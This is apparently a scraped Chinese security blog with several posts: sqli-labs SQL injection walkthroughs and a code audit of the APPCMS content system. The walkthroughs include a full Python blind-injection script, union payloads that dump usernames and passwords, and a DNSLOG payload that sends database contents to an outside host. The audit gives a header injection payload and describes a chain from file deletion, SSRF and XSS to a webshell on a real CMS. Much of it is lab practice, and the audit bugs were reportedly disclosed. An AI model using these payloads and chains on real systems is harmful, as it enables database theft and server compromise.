<pre><code>&apos; and (select count(column_name) from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos;)=4--+
</code></pre><p>猜解列长度:(改变substr的第二个参数进行猜解)</p>
<pre><code>&apos; and ascii(substr((select column_name from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos; limit 0,1),1,1))--+
</code></pre><p>猜解列名:</p>
<pre><code>&apos; and ascii(substr((select column_name from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos; limit 0,1),1,1))=97--+
</code></pre><p>然后就是猜解列中的数据了(这里以username列为例)</p>
<p>猜解<code>username</code>列中的数据量:</p>
<pre><code>&apos; and (select count(username) from security.users)=13--+;
</code></pre><p>猜解<code>username</code>列第一条数据的长度:</p>
<pre><code>&apos; and ascii(substr((select username from security.users limit 0,1),1,1))--+
</code></pre><p>猜解<code>username</code>列第一条数据的长度</p>
<pre><code>&apos; and ascii(substr((select username name from security.users limit 0,1),1,1))=97--+
</code></pre><p>附完整python代码:</p>
<pre><code># -*- coding: utf-8 -*-
#author: P0rZ9
#env: python2 
#fun: Sqli-labs less5

import requests
import string

url = &quot;http://127.0.0.1:86/less-5/index.php?id=1&quot;
str1 = string.letters + string.digits + &quot;_!@#*&quot;

database_name = &quot;&quot;
table_num = 0
table_list = []
column_dic = {}
column_list = []
date_list = []

#猜解数据库长度
print &quot;开始猜解数据库长度......&quot;
for i in range(30):
    payload = &quot;&apos; and length(database())={}--+&quot;.format(str(i))
    re = requests.get(url+payload)
    #print url+payload
    if &apos;You are in...........&apos; in re.text and re.status_code == 200:
        database_length = i
        #print &apos;database_length:%d&apos;%(database_length)
        break
print &quot;数据库长度为%s&quot;%(database_length)
#database_length：8

#猜解数据库名
print &quot;开始猜解数据库名......&quot;
for i in range(1,database_length+1):
    for chr in str1:
        payload = &quot;&apos; and ascii(substr(database(),{},1))={}--+&quot;.format(str(i),ord(chr)) 
        re = requests.get(url+payload)
        #print url+payload
        if &apos;You are in...........&apos; in re.text and re.status_code == 200:
            database_name += chr
            break
        else:
            pass
print &quot;数据库名为%s&quot;%(database_name)
#database_name：security

#猜解数据表个数
print &quot;开始猜解表的数量......&quot;
for i in range(30):
    payload = &quot;&apos; and (select count(table_name) from information_schema.tables where table_schema=&apos;%s&apos;)=%s--+&quot;%(database_name,str(i))
    re = requests.get(url+payload)
    #print url+payload
    if &apos;You are in...........&apos; in re.text and re.status_code == 200:
        table_num = i
        break
    else:
        pass
print &quot;表的数量为:%s&quot;%(str(table_num))
#table_num:4


#表长度及名称
#表长
print &quot;开始猜解表名.......&quot;
for i in range(table_num):
    table_name = &quot;&quot;
    for j in range(10):
        payload = &quot;&apos; and length((select table_name from information_schema.tables where table_schema=&apos;%s&apos; limit %s,1))=%s--+&quot;%(database_name,str(i),str(j))
        re = requests.get(url+payload)
        #print url+payload
        if &apos;You are in...........&apos; in re.text and re.status_code == 200:
            table_len = j
            #print table_len

            #表名
            for k in range(table_len):#6
                for chr in str1:
                    payload = &quot;&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=&apos;%s&apos; limit %s,1),%s,1))=%s--+&quot;%(database_name,str(i),str(k+1),ord(chr))
                    #print url+payload
                    re = requests.get(url+payload)
                    if &apos;You are in...........&apos; in re.text and re.status_code == 200:
                        table_name += chr
                        break
            #print &quot;%s:%s位&quot;%(table_len,table_name)
            table_list.append(table_name)
            break
print table_list
#table_list = [&apos;uagents&apos;,&apos;referers&apos;,&apos;emails&apos;,&apos;users&apos;]


#字段

#猜解列的个数
print &quot;开始猜解%s的列个数&quot;%(table_list[-1])
for i in range(20):
    payload = &quot;&apos; and (select count(column_name) from information_schema.columns where table_schema=&apos;%s&apos; and table_name=&apos;%s&apos;)=%s--+&quot;%(database_name,table_list[-1],str(i))
    re = requests.get(url+payload)
    #print url+payload
    if &apos;You are in...........&apos; in re.text and re.status_code == 200:
        column_num = i
        #print &quot;%s:%s个表&quot;%(table_list[-1],column_num)
        column_dic.setdefault(table_list[-1],column_num)
        break

print &quot;%s的列个数为%s&quot;%(table_list[-1],column_dic[&apos;users&apos;])
#column_dic:{&apos;users&apos;: 3}



#猜解列的长度及列名
print &quot;开始猜解%s的列名......&quot;%(table_list[-1])

for i in range(column_dic[table_list[-1]]):#4
    column_name = &quot;&quot;
    for j in range(20):
        payload = &quot;&apos; and ascii(substr((select column_name from information_schema.columns where table_schema=&apos;%s&apos; and table_name=&apos;%s&apos; limit %s,1),%s,1))--+&quot;%(database_name,table_list[-1],str(i),str(j+1))
        #print url+payload
        re = requests.get(url+payload)

        if &apos;You are in&apos; not in re.text and re.status_code == 200:
            column_len = j
            #print column_len
            for k in range(column_len):
                for chr in str1:
                    payload = &quot;&apos; and ascii(substr((select column_name from information_schema.columns where table_schema=&apos;%s&apos; and table_name=&apos;%s&apos; limit %s,1),%s,1))=%s--+&quot;%(database_name,table_list[-1],str(i),str(k+1),ord(chr))
                    re = requests.get(url+payload)
                    #print url+payload
                    if &apos;You are in...........&apos; in re.text and re.status_code == 200:
                        column_name += chr
                        break

            print column_name
            column_list.append(column_name)
            break
print &quot;%s表有%s字段,分别为:%s&quot;%(table_list[-1],column_dic[table_list[-1]],column_list)
#column_list = [&apos;id&apos;,&apos;username&apos;,&apos;password&apos;]




print &quot;开始猜解%s表的数据量.......&quot;%(table_list[-1])
for i in range(20):
    payload = &quot;&apos; and (select count(%s) from %s)=%s--+;&quot;%(column_list[1],table_list[-1],str(i))
    re = requests.get(url+payload)
    #print url+payload
    if &apos;You are in...........&apos; in re.text and re.status_code == 200:
        data_num = i
        break
print &quot;得到%s表的数据量为%s组&quot;%(table_list[-1],str(data_num))
#data_num:13

print &quot;开始猜解%s表的%s列的数据.......&quot;%(table_list[-1],column_list[1])
for i in range(data_num):
    for j in range(20):
        date_name = &quot;&quot;
        payload = &quot;&apos; and ascii(substr((select %s from %s.%s limit %s,1),%s,1))--+&quot;%(column_list[1],database_name,table_list[-1],str(i),str(j+1))
        re = requests.get(url+payload)
        #print url+payload
        if &apos;You are in...........&apos; not in re.text and re.status_code == 200:

            for k in range(j):  #输入每个字符的长度
                for chr in str1:
                    payload = &quot;&apos; and ascii(substr((select %s name from %s.%s limit %s,1),%s,1))=%s--+&quot;%(column_list[1],database_name,table_list[-1],str(i),str(k+1),str(ord(chr)))
                    re = requests.get(url+payload)
                    #print url+payload
                    if &apos;You are in...........&apos; in re.text and re.status_code == 200:
                        date_name += chr
                        break
            date_list.append(date_name)
            break        
print &quot;%s表的%s列的数据:%s&quot;%(table_list[-1],column_list[1],date_list)
</code></pre><p>运行结果:<br><img src="http://static.zybuluo.com/chhyx/2n73z1533r7e7j9spwymv4tt/image_1cqfl19qe1eb21vb11nor1itstknp.png" alt="image_1cqfl19qe1eb21vb11nor1itstknp.png-101kB"></p>
<p>写这个脚本时主要是为了学习盲注,但是写完发现还有好多可改进的地方,比如没用函数包裹,猜解效率太低(可以考虑使用二分法)。有时间再改吧。</p>
<p>##<strong>Less-6:</strong><br>加单引号<code>&#39;</code>页面无明显返回:<br><img src="http://static.zybuluo.com/chhyx/742qe6uxv1qzc8q878jbizq2/image_1cqfsnokf112n1pokbbe1m6mn150.png" alt="image_1cqfsnokf112n1pokbbe1m6mn150.png-207.4kB"></p>
<p>加个双引号<code>&quot;</code>试试:<br><img src="http://static.zybuluo.com/chhyx/7833nzrji74ghcfxxqrck3qj/image_1cqfsl3oa1f15uin13p41gcd9j51j.png" alt="image_1cqfsl3oa1f15uin13p41gcd9j51j.png-214.6kB"></p>
<p>我们输入的1”变成了’”1”” limit 0,1’ 可发现多了一个双引号 我们注释掉它继续猜解。且我们可猜测后台处理语句为:</p>
<pre><code>$sql=&quot;SELECT * FROM users WHERE id=&quot;$id&quot; LIMIT 0,1&quot;;
</code></pre><p>那我们将Less-5所用payload中的<code>&#39;</code>改为<code>&quot;</code>即可成功利用。</p>
<p><img src="http://static.zybuluo.com/chhyx/z4iksin5ba3qjblj36bd7srh/image_1cqftpsuureu1uh18071tcl1djp9e.png" alt="image_1cqftpsuureu1uh18071tcl1djp9e.png-54.9kB"></p>
<p><strong>DNSLOG注入</strong><br>当然这里也可以使用DNSLOG来盲注,不清楚的可以先看看笔者前几天的文章:<br><a href="https://p0rz9.github.io/2018/09/26/%E5%88%A9%E7%94%A8DNSLOG%E5%BF%AB%E9%80%9F%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%28%E7%9B%B2%E6%B3%A8%29/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/09/26/利用DNSLOG快速获取数据(盲注)</a></p>
<p>获取数据库名:</p>
<pre><code>id=1&apos; and if((select load_file(concat(&apos;\\\\&apos;,(select database()),&apos;.xxxxx.ceye.io\\abc&apos;))),1,0)--+
</code></pre><p>即可在我们的dns平台查看数据库内容:<br><img src="http://static.zybuluo.com/chhyx/6pxiwvjna84pwnrocve6aj8j/image_1cqg1ucob1k9jmbe1emh1iml1nqo9.png" alt="image_1cqg1ucob1k9jmbe1emh1iml1nqo9.png-46.2kB"></p>
<p>获取表名：</p>
<pre><code>&apos; and if((select load_file(concat(&apos;\\\\&apos;,(select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),&apos;.xxxxx.ceye.io\\abc&apos;))),1,0)--+
</code></pre><p><img src="http://static.zybuluo.com/chhyx/1hf0mvtjsayzma47kbr7zuo3/image_1cqg2dqhh1gbj1rpm26q1arr16dm16.png" alt="image_1cqg2dqhh1gbj1rpm26q1arr16dm16.png-99.1kB"></p>
<p>之后更换我们的SQL语句即可获取数据。这种方式的优点是获取数据快,但是利用的条件相对来说较苛刻。不过在平常的测试中作为一种测试手法还是可以的。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/22/Sqli-labs_Less1-4/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/10/22/Sqli-labs_Less1-4/" itemprop="url">Sqli-labs Error Based Sqli Less1-4</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-22T08:15:41+08:00">
                2018-10-22
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>项目下载地址:<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a><br>基础部分请参考笔者以前的文章:<br><a href="https://p0rz9.github.io/2018/10/15/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/10/15/SQL注入基础/</a><br><a href="https://p0rz9.github.io/2018/10/12/mysql%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/10/12/mysql基础命令/</a></p>
<p><strong>Less-1:</strong></p>
<p>通过更换id观察,可发现程序会通过遍历id获取对应的<code>name</code>与<code>password</code>:<br><img src="http://static.zybuluo.com/chhyx/kwee90sb6uk38mne895liw0u/image_1cqcvjah013o172f1qq9ncld61m.png" alt="image_1cqcvjah013o172f1qq9ncld61m.png-34.3kB"><br><img src="http://static.zybuluo.com/chhyx/19yl78kf7inas5m645h5tbp3/image_1cqcvk5631ij017br11471qk127s13.png" alt="image_1cqcvk5631ij017br11471qk127s13.png-35.5kB"></p>
<p>加<code>&#39;</code>查看报错信息:<br><img src="http://static.zybuluo.com/chhyx/ycj2g4ihotcyr7osq3th27ds/image_1cqd1hmpqpgf1035av8s83rat51.png" alt="image_1cqd1hmpqpgf1035av8s83rat51.png-35.5kB"></p>
<p>在上述的错误信息中,我们可以看到我们输入的1’在经过sql语句拼接后构成了 <code>&#39;1&#39;&#39; limit 0,1</code> 多加了一个<code>&#39;</code>,那我们可以利用在输入语句最后加注释(–+)的方法将他注释掉。</p>
<p>查看字段:</p>
<pre><code>http://127.0.0.1:86/less-1/index.php?id=1&apos; order by 3--+ 正确
http://127.0.0.1:86/less-1/index.php?id=1&apos; order by 4--+ 错误
</code></pre><p>说明字段为3,因为<code>order by 3</code> 表示用查询字段中的第3个字段进行排序,而<code>order by 4</code>报错说明不存在第4个字段,表明该表一共具有3个字段。</p>
<p>判断显示位:</p>
<pre><code>http://127.0.0.1:86/less-1/index.php?id=-1&apos; union select 1,2,3--+ 
</code></pre><p><img src="http://static.zybuluo.com/chhyx/mem0kwpifpbgx05yeq5s6z7b/image_1cqd00bpc10g5ttl4cb1b58qrh20.png" alt="image_1cqd00bpc10g5ttl4cb1b58qrh20.png-33.9kB"></p>
<p>使用union时,必须使前面的sql语句查询出错(不存在id=-1的用户),因为只有前面的sql语句结果为空就会显示我们自己构造的SQL语句 即<code>select 1,2,3</code></p>
<p>爆数据库名(将显示位替换为mysql的信息函数):<br><img src="http://static.zybuluo.com/chhyx/a5shqxuf55lzhsk6s2u1ehwl/image_1cqd07827jru1fnj1mll1slr1s7i2d.png" alt="image_1cqd07827jru1fnj1mll1slr1s7i2d.png-35.7kB"></p>
<p>表明当前使用的数据库名为<code>security</code> 用户为<code>root@localhost</code></p>
<p>爆<code>security</code>数据库的所有表名:</p>
<pre><code>http://127.0.0.1:86/less-1/index.php?id=-1&apos; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;),3--+ 
</code></pre><p><img src="http://static.zybuluo.com/chhyx/4mdwydzoarb2e96xaerxuur0/image_1cqd0h3gn1gj513qqqh6rhi8lf2q.png" alt="image_1cqd0h3gn1gj513qqqh6rhi8lf2q.png-53.4kB"></p>
<p>爆<code>users</code>表下的所有字段名:</p>
<pre><code>http://127.0.0.1:86/less-1/index.php?id=-1&apos; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos;),3--+ 
</code></pre><p><img src="http://static.zybuluo.com/chhyx/w0hpd6qqop1tqytcw5tr6ntn/image_1cqd0ld8t1dh3ebeeeeeihh5l47.png" alt="image_1cqd0ld8t1dh3ebeeeeeihh5l47.png-46.6kB"></p>
<p>获取<code>username</code>与<code>password</code>内容:</p>
<pre><code>http://127.0.0.1:86/less-1/index.php?id=-1&apos; union select 1,(select group_concat(username,&apos;:&apos;,password) from security.users),3--+ 
</code></pre><p><img src="http://static.zybuluo.com/chhyx/ond8909uzodpo0f40r9dujth/image_1cqd0q9aj1qbosesl631n8s1u74k.png" alt="image_1cqd0q9aj1qbosesl631n8s1u74k.png-62.1kB"></p>
<p><code>Less-1</code>源码:</p>
<pre><code>&lt;?php
//including the Mysql connect parameters.
include(&quot;../sql-connections/sql-connect.php&quot;);
error_reporting(0);
// take the variables 
if(isset($_GET[&apos;id&apos;]))
{
$id=$_GET[&apos;id&apos;];
//logging the connection parameters to a file for analysis.
$fp=fopen(&apos;result.txt&apos;,&apos;a&apos;);
fwrite($fp,&apos;ID:&apos;.$id.&quot;\n&quot;);
fclose($fp);

// connectivity 

$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;
$result=mysql_query($sql);
$row = mysql_fetch_array($result);

    if($row)
    {
      echo &quot;&lt;font size=&apos;5&apos; color= &apos;#99FF00&apos;&gt;&quot;;
      echo &apos;Your Login name:&apos;. $row[&apos;username&apos;];
      echo &quot;&lt;br&gt;&quot;;
      echo &apos;Your Password:&apos; .$row[&apos;password&apos;];
      echo &quot;&lt;/font&gt;&quot;;
      }
    else 
    {
    echo &apos;&lt;font color= &quot;#FFFF00&quot;&gt;&apos;;
    print_r(mysql_error());
    echo &quot;&lt;/font&gt;&quot;;  
    }
}
    else { echo &quot;Please input the ID as parameter with numeric value&quot;;}

?&gt;
</code></pre><p><code>Less1-Less4</code>都可利用上述<code>union</code>操作进行注入,下面就不再追溯了。</p>
<p><strong>Less-2:</strong></p>
<p>查看报错信息:<br><img src="http://static.zybuluo.com/chhyx/fqi5jyne11u1ehliyzs0ry7l/image_1cqd1lh8q1d1v76030n10ub9kc5u.png" alt="image_1cqd1lh8q1d1v76030n10ub9kc5u.png-45.2kB"><br>因为报错信息是在<code>limit 0,1</code>附近,猜测后台查询语句为:<code>$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1</code>对id无处理 直接查询。</p>
<p>查看字段:</p>
<pre><code>http://127.0.0.1:86/less-2/index.php?id=1 order by 3--+
http://127.0.0.1:86/less-2/index.php?id=1 order by 4--+
</code></pre><p>判断显示位:</p>
<pre><code>http://127.0.0.1:86/less-2/index.php?id=-1 union select 1,2,3--+
</code></pre><p>之后与<code>Less-1</code>一样 将显示位替换为查询语句即可。</p>
<p><code>Less-2</code>源码,只列出sql语句部分 剩下的与<code>Less-1</code>相同:</p>
<pre><code>$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;
</code></pre><p><strong>Less-3:</strong></p>
<p>报错信息:<br><img src="http://static.zybuluo.com/chhyx/un3nxsfayp67s4breg7c3cl0/image_1cqd1rn40qsg17jj1qre1bq812129q.png" alt="image_1cqd1rn40qsg17jj1qre1bq812129q.png-209.5kB"><br>根据报错信息 这里就需要闭合下单引号与括号了</p>
<p>查看字段:</p>
<pre><code>http://127.0.0.1:86/less-3/index.php?id=1&apos;) order by 3--+
http://127.0.0.1:86/less-3/index.php?id=1&apos;) order by 4--+
</code></pre><p>判断显示位:</p>
<pre><code>http://127.0.0.1:86/less-3/index.php?id=-1&apos;) union select 1,2,3--+
</code></pre><p>之后与<code>Less-1</code>一样 将显示位替换为查询语句即可。</p>
<p><code>Less-3</code>源码,只列出sql语句部分 剩下的与<code>Less-1</code>相同:</p>
<pre><code>$sql=&quot;SELECT * FROM users WHERE id=(&apos;$id&apos;) LIMIT 0,1&quot;;
</code></pre><p><strong>Less-4:</strong></p>
<p>输入单引号发现不报错:<br><img src="http://static.zybuluo.com/chhyx/mmkfe12lisrvwpd525f6er0o/image_1cqd22cokoj87a31vuspo25a0an.png" alt="image_1cqd22cokoj87a31vuspo25a0an.png-60.6kB"></p>
<p>再次测试双引号 成功报错:<br><img src="http://static.zybuluo.com/chhyx/iz7bh878j9fsrtxt1q7zpq9t/image_1cqd23l5j1lhi7jai3q126a5lsb4.png" alt="image_1cqd23l5j1lhi7jai3q126a5lsb4.png-209.2kB"></p>
<p>所以这里需要闭合双引号与括号</p>
<p>查看字段:</p>
<pre><code>http://127.0.0.1:86/less-4/index.php?id=1&quot;) order by 3--+
http://127.0.0.1:86/less-4/index.php?id=1&quot;) order by 4--+
</code></pre><p>判断显示位:</p>
<pre><code>http://127.0.0.1:86/less-3/index.php?id=1&quot;) union select 1,2,3--+
</code></pre><p>之后与<code>Less-1</code>一样 将显示位替换为查询语句即可。</p>
<p><code>Less-4</code>源码,只列出sql语句部分,剩下的与<code>Less-1</code>相同:</p>
<pre><code>$sql=&quot;SELECT * FROM users WHERE id=(&apos;$id&apos;) LIMIT 0,1&quot;;
</code></pre>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/21/APPCMS详细审计/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/10/21/APPCMS详细审计/" itemprop="url">代码审计 | APPCMS详细审计</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-21T08:15:41+08:00">
                2018-10-21
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>自己试着审计了下APPCMS,发现了一些问题,漏洞提交后写下这篇文章,记录一下。</p>
</blockquote>
<hr>
<p>发下的问题:</p>
<p>##<strong>1.配置文件用双引号 可执行任意命令</strong><br>    利用点:重装配置或后台修改网站配置时传入<code>${@phpinfo()}(可变变量)</code>即可</p>
<p>##<strong>2.后台模板存在代码执行与任意文件读取</strong><br>    模板为php后缀结尾,直接插入代码即可执行。获取模板内容时,可指定任 意文件造成任意文件读取</p>
<p>##<strong>3.三处任意文件删除</strong><br>(漏洞函数<code>m_del_resource()  m__delse()  m__del()</code>) 原因是都使用了底层定义的“问题”函数<code>de_resource()</code>导致</p>
<p>其中<code>m__del()</code>处的漏洞利用:<br>先将要删除的文件写入应用的logo处,然后在删除这个应用的时候触发<br><img src="http://static.zybuluo.com/chhyx/ubga64ktt6z1fyoj24xn1li1/image_1cq8rtii81jit120p12c4l1911bjm.png" alt="image_1cq8rtii81jit120p12c4l1911bjm.png-70kB"><br><img src="http://static.zybuluo.com/chhyx/9i8f0w73zt9eeo7lgcm0ue76/image_1cq8ru0toekeghv1ss1vq11f3i1j.png" alt="image_1cq8ru0toekeghv1ss1vq11f3i1j.png-105.6kB"></p>
<p>扩大危害:通过删除<code>install.lock.php</code>文件去重装CMS,然后在重装时,将PHP代码写进配置文件进行<code>Getshell</code>。</p>
<p>##<strong>4.readfile()导致的ssrf漏洞:</strong><br>漏洞文件:</p>
<pre><code>#upload\pic.php

&lt;?php
if(isset($_GET[&apos;url&apos;]) &amp;&amp; trim($_GET[&apos;url&apos;]) != &apos;&apos; &amp;&amp; isset($_GET[&apos;type&apos;])) {
    $img_url=trim($_GET[&apos;url&apos;]);
    $img_url = base64_decode($img_url);
    $img_url=strtolower(trim($img_url));
    $_GET[&apos;type&apos;]=strtolower(trim($_GET[&apos;type&apos;]));
    //var_dump(chr(0));die();

    $urls=explode(&apos;.&apos;,$img_url);
    //var_dump($img_url);die();
    if(count($urls)&lt;=1) die(&apos;image type forbidden 0&apos;);
    $file_type=$urls[count($urls)-1]; 

    if(in_array($file_type,array(&apos;jpg&apos;,&apos;gif&apos;,&apos;png&apos;,&apos;jpeg&apos;))){}else{ die(&apos;image type foridden 1&apos;);}

    if(strstr($img_url,&apos;php&apos;)) die(&apos;image type forbidden 2&apos;);

    if(strstr($img_url,chr(0)))die(&apos;image type forbidden 3&apos;);
    if(strlen($img_url)&gt;256)die(&apos;url too length forbidden 4&apos;);

    header(&quot;Content-Type: image/{$_GET[&apos;type&apos;]}&quot;);

    readfile($img_url);

} else {
    die(&apos;image not find！&apos;);
}

?&gt;
</code></pre><p>这里<code>readfile()</code>造成ssrf漏洞</p>
<pre><code>对传进来的url参数进行base64解码
最后需含有.jpg         ?1.jpg即可绕过
url不含php大小写 
过滤chr(0)防止00截断
长度不超过256个字符
</code></pre><p>经测试,这个是有回显的ssrf,可用于内网探测及进一步的内网渗透</p>
<p>利用:将<code>http://127.0.0.1:80/?1.jpg</code>经<code>base64</code>编码赋值给<code>$url</code>然后去爆破,这里我是将整个url设置为爆破参数 去爆破的</p>
<p><img src="http://static.zybuluo.com/chhyx/9x9p8y09s4vptj7ebgf4282a/image_1cq8hnl5t1frgoui1176o5ot09.png" alt="image_1cq8hnl5t1frgoui1176o5ot09.png-89.9kB"></p>
<p>爆破出83 81 85 89等端口是存在的</p>
<p>漏洞利用:</p>
<pre><code>读取非PHP文件
探测内网开放情况
</code></pre><p>##<strong>5.留言处insert注入:</strong><br>漏洞文件:</p>
<pre><code>#upload\commont.php m__add()
function m__add() {
    ...
    $fields[&apos;ip&apos;] = helper :: getip();//
....
$res = $dbm -&gt; single_insert(TB_PREFIX . &apos;comment&apos;, $fields);
</code></pre><p><img src="http://static.zybuluo.com/chhyx/t0bljlcchrcapy3902xowz40/image_1cq8vgsipdrjvgk1cup1fvctqf2q.png" alt="image_1cq8vgsipdrjvgk1cup1fvctqf2q.png-57.4kB"></p>
<p>跟进<code>getip()</code>函数:</p>
<pre><code>#upload\core\helper.class.php
public static function getip() {
    $onlineip = &apos;&apos;;
    if (getenv(&apos;HTTP_CLIENT_IP&apos;) &amp;&amp; strcasecmp(getenv(&apos;HTTP_CLIENT_IP&apos;), &apos;unknown&apos;)) {
        $onlineip = getenv(&apos;HTTP_CLIENT_IP&apos;);
    } elseif (getenv(&apos;REMOTE_ADDR&apos;) &amp;&amp; strcasecmp(getenv(&apos;REMOTE_ADDR&apos;), &apos;unknown&apos;)) {
        $onlineip = getenv(&apos;REMOTE_ADDR&apos;);
    } elseif (isset($_SERVER[&apos;REMOTE_ADDR&apos;]) &amp;&amp; $_SERVER[&apos;REMOTE_ADDR&apos;] &amp;&amp; strcasecmp($_SERVER[&apos;REMOTE_ADDR&apos;], &apos;unknown&apos;)) {
        $onlineip = $_SERVER[&apos;REMOTE_ADDR&apos;];
    }
    return $onlineip;
}
</code></pre><p>很明显这里没过滤,可伪造ip与注入语句,跟进<code>single_insert()</code>函数:</p>
<pre><code>public function single_insert($table_name, $fields) {
...
$sql_field = &quot;&quot;;
$sql_value = &quot;&quot;; 
// 遍历字段和值
foreach($fields as $key =&gt; $value) {
    $sql_field .= &quot;,$key&quot;;
    $sql_value .= &quot;,&apos;$value&apos;&quot;;
} 

$sql_field = substr($sql_field, 1);
$sql_value = substr($sql_value, 1);

$sql = &quot;insert into $table_name ($sql_field) values ($sql_value)&quot;; //组合SQL

var_dump($sql);
</code></pre><p>$result = $this -&gt; query_insert($sql);<br>    return $result;<br>    }</p>
<p>可看到这里的对传进来的<code>$fields</code>数组并无过滤,直接拼接到<code>sql</code>语句中导致注入。<br>但是这里的情况是</p>
<pre><code>a.执行完插入评论的sql语句后的结果返回到了$res中,但是下面并没有输出$res[&apos;error&apos;]     //不能使用报错注入
b.需要闭合一个用应用程序&quot;已经打开但还未关闭&quot;的参数(ip)
c.这里的IP字段限制为20个字符 想直接在这个位置获取数据不太现实
</code></pre><p><img src="http://static.zybuluo.com/chhyx/vgrxfqy384rmasyffsmy4m06/image_1cqa4s1ce13fi176cjllun916u49.png" alt="image_1cqa4s1ce13fi176cjllun916u49.png-57.8kB"></p>
<p>所以我们采用<code>insert</code>插入2条数据的方式将注入语句插在前台显示的字段<code>(uname,content,date_add,ip)</code>即可。(这里的<code>date_add</code>与<code>ip</code>长度限制为11、20)<br>payload:</p>
<pre><code>client-ip: 1&apos;),(&apos;1&apos;,&apos;0&apos;,&apos;0&apos;,(select user()),&apos;aa&apos;,&apos;1540085527&apos;,&apos;2.2.2.2&apos;)#
</code></pre><p><img src="http://static.zybuluo.com/chhyx/63jlre1n5oag3od5gcfi925y/image_1cq91e1cd1mv353fe1qttg1b37.png" alt="image_1cq91e1cd1mv353fe1qttg1b37.png-185.5kB"></p>
<p>返回前台评论区查看:<br><img src="http://static.zybuluo.com/chhyx/d5im0deb7h6cin0l1jow9uhz/image_1cqa6otgtbj7175a81u1udtj422d.png" alt="image_1cqa6otgtbj7175a81u1udtj422d.png-52.9kB"><br>成功得到<code>user()</code>信息。</p>
<p>这是两句废话:<br>如果我们改变一下ip的限制长度且将<code>$ress[&#39;error&#39;]</code>改为<code>$res[&#39;error&#39;]</code>即可报错注入。</p>
<p><img src="http://static.zybuluo.com/chhyx/9kj23whc7egbdkt2epykvcis/image_1cqa6gpvl1jl71ups1552rlq166g1g.png" alt="image_1cqa6gpvl1jl71ups1552rlq166g1g.png-117.3kB"></p>
<p>##<strong>注入深入利用</strong></p>
<p>漏洞利用:参照之前笔者的文章:<a href="https://p0rz9.github.io/2018/10/17/PbootCMS_V1.2.1%E7%BB%84%E5%90%88%E6%BC%8F%E6%B4%9E%E4%B9%8B%E5%89%8D%E5%8F%B0%E6%97%A0%E9%99%90%E5%88%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" target="_blank" rel="noopener">PbootCMS_V1.2.1组合漏洞之前台无限制命令执行</a>,这里我们可以用<code>insert注入+xss+来GETSHELL</code></p>
<pre><code>1.插入xss代码获取 后台路径及管理员cookie
2.利用load_file()任意文件读取(需知道路径)
3.获取后台账号密码（该APPCMS更换了后台路径）
4.后台php文件写shell
</code></pre><p><strong>读取文件:</strong><br>我们要读取文件,首先要使其报错获取网站绝对路径:<br><img src="http://static.zybuluo.com/chhyx/23ejc5lluw9cvai8nqo2i8qz/image_1cqan4cuu1urc1upr187i1ns7q5n16.png" alt="image_1cqan4cuu1urc1upr187i1ns7q5n16.png-116.9kB"><br><img src="http://static.zybuluo.com/chhyx/e5x9prqs06fuw9t2pvh0aay6/image_1cqan2b5t18jeh2qre9usqlivp.png" alt="image_1cqan2b5t18jeh2qre9usqlivp.png-113.1kB"></p>
